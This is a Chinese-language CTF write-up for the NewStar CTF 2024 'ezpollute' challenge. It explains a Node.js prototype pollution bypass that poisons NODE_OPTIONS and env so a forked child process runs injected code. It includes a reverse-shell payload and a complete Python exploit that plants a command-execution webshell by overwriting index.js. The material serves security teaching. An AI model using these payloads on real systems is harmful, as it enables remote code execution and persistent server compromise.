---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---

# ezpollute

根据题目名称可知，这是一道 JavaScript 的原型链污染题

查看部署文件，可以得知 Node.js 版本为 16，并且使用了 `node-dev` 热部署启动

![Dockerfile](/assets/images/wp/2024/week4/ezpollute_1.png)

审计 `index.js`，`/config` 路由下调用了 `merge` 函数，`merge` 函数意味着可能存在的原型链污染漏洞

```javascript
router.post('/config', async (ctx) => {
    jsonData = ctx.request.rawBody || "{}"
    token = ctx.cookies.get('token')
    if (!token) {
        return ctx.body = {
            code: 0,
            msg: 'Upload Photo First',
        }
    }
    const [err, userID] = decodeToken(token)
    if (err) {
        return ctx.body = {
            code: 0,
            msg: 'Invalid Token',
        }
    }
    userConfig = JSON.parse(jsonData)
    try {
        finalConfig = clone(defaultWaterMarkConfig)
        // 这里喵
        merge(finalConfig, userConfig)
        fs.writeFileSync(path.join(__dirname, 'uploads', userID, 'config.json'), JSON.stringify(finalConfig))
        ctx.body = {
            code: 1,
            msg: 'Config updated successfully',
        }
    } catch (e) {
        ctx.body = {
            code: 0,
            msg: 'Some error occurred',
        }
    }
})
```

`merge` 函数在 `/util/merge.js` 中，虽然过滤了 `proto`，但我们可以通过 `constructor.prototype` 来绕过限制

```javascript
// /util/merge.js
function merge(target, source) {
    if (!isObject(target) || !isObject(source)) {
        return target
    }
    for (let key in source) {
        if (key === "__proto__") continue
        if (source[key] === "") continue
        if (isObject(source[key]) && key in target) {
            target[key] = merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target
}
```

`/process` 路由调用了 `fork`，创建了一个 JavaScript 子进程用于水印添加

```javascript
try {
        await new Promise((resolve, reject) => {

            // 这里喵
            const proc = fork(PhotoProcessScript, [userDir], { silent: true })

            proc.on('close', (code) => {
                if (code === 0) {
                    resolve('success')
                } else {
                    reject(new Error('An error occurred during execution'))
                }
            })

            proc.on('error', (err) => {
                reject(new Error(`Failed to start subprocess: ${err.message}`))
            })
        })
        ctx.body = {
            code: 1,
            msg: 'Photos processed successfully',
        }
    } catch (error) {
        ctx.body = {
            code: 0,
            msg: 'some error occurred',
        }
    }
```

结合之前的原型链污染漏洞，我们污染 `NODE_OPTIONS` 和 `env`，在 `env` 中写入恶意代码，`fork` 在创建子进程时就会首先加载恶意代码，从而实现 RCE

```python
payload = {
    "constructor": {
        "prototype": {
            "NODE_OPTIONS": "--require /proc/self/environ",
            "env": {
                 "A":"require(\"child_process\").execSync(\"bash -c \'bash -i >& /dev/tcp/ip/port 0>&1\'\")//"
            }
        }
    }
}
# 需要注意在 Payload 最后面有注释符 `//`，这里的思路跟 SQL 注入很像
```

考虑到新生可能没有云服务器来反弹 shell，因此在赛题设计时选择了热部署启动

除了弹 shell，还可以通过写 WebShell 覆盖 `index.js`，从而实现有回显 RCE，或者把 flag 输出到 `static` 目录下读也可以

比赛时题目环境并没有出网，弹不了 shell，只能通过后两种方式来做，这里给出写 WebShell 的做法

:::tip 热部署
就是在应用正在运行的时候升级软件，却不需要重新启动应用
:::

```python
import requests
import re
import base64
from time import sleep

url = "http://url:port"

# 获取 token
# 随便发送点图片获取 token
files = [
    ('images', ('anno.png', open('./1.png', 'rb'), 'image/png')),
    ('images', ('soyo.png', open('./2.png', 'rb'), 'image/png'))
]
res = requests.post(url + "/upload", files=files)
token = res.headers.get('Set-Cookie')
match = re.search(r'token=([a-f0-9\-\.]+)', token)
if match:
    token = match.group(1)
    print(f"[+] token: {token}")
headers = {
    'Cookie': f'token={token}'
}

# 通过原型链污染 env 注入恶意代码即可 RCE

# 写入 WebShell
webshell = """
const Koa = require('koa')
const Router = require('koa-router')
const app = new Koa()
const router = new Router()

router.get("/webshell", async (ctx) => {
    const {cmd} = ctx.query
    res = require('child_process').execSync(cmd).toString()
    return ctx.body = {
        res
    }
})

app.use(router.routes())
app.listen(3000, () => {
    console.log('http://127.0.0.1:3000')
})
"""

# 将 WebShell 内容 Base64 编码
encoded_webshell = base64.b64encode(webshell.encode()).decode()

# Base64 解码后写入文件
payload = {
    "constructor": {
        "prototype": {
            "NODE_OPTIONS": "--require /proc/self/environ",
            "env": {
                "A": f"require(\"child_process\").execSync(\"echo {encoded_webshell} | base64 -d > /app/index.js\")//"
            }
        }
    }
}

# 原型链污染
requests.post(url + "/config", json=payload, headers=headers)

# 触发 fork 实现 RCE
try:
    requests.post(url + "/process", headers=headers)
except Exception as e:
    pass

sleep(2)
# 访问有回显的 WebShell
res = requests.get(url + "/webshell?cmd=cat /flag")
print(res.text)
```
